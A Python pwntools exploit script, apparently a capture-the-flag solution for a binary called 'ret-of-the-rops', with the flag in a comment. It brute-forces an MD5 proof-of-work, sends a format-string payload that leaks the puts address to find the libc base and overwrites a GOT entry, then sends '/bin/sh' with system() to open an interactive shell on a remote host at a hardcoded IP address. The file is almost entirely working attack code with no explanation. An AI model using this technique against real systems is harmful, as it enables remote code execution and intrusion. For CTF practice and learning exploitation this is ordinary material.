#flag = flag{w3_d0n't_n33d_n0_rdx_g4dg3t,ret2csu_15_d3_w4y_7821243}
from pwn import *
import hashlib
import string
import sys
from itertools import chain, product

elf = ELF('./ret-of-the-rops')
libc = ELF("./libc6_2.31-0ubuntu7_amd64.so")
ld = ELF("./ld-2.31.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote('161.97.176.150', 2222)

def computePow(given):
	def generatestr(size=4, chars=string.ascii_lowercase):
		return (''.join(candidate)
			for candidate in chain.from_iterable(product(chars, repeat=i)
				for i in range(1, size+1)))
	
	for s in generatestr():
		m = hashlib.md5()
		m.update(s)
		d = m.hexdigest()
		if str(d[-6:]) == str(given):
			return s

target.recvuntil("MD5(X)[-6:] = ")
solution = computePow(target.recv(6))
log.success("String found: " + solution)
target.sendline(solution)

target.recvuntil("?\n")
payload  = ""
payload += ("%7$s".ljust(8, " ") + p64(elf.got['puts']))
payload += "\x00"*(0x20 - len(payload)) + p64(elf.got['printf'] + 0x20 - 8) + p64(0x4011d5)
target.sendline(payload)

libc_base = u64(target.recv(6).ljust(8, "\x00")) - libc.sym['puts']
log.info("LIBC base: " + hex(libc_base))

payload2  = ""
payload2 += "/bin/sh\x00" + p64(libc_base + libc.sym['system'])
target.sendline(payload2)

target.interactive()
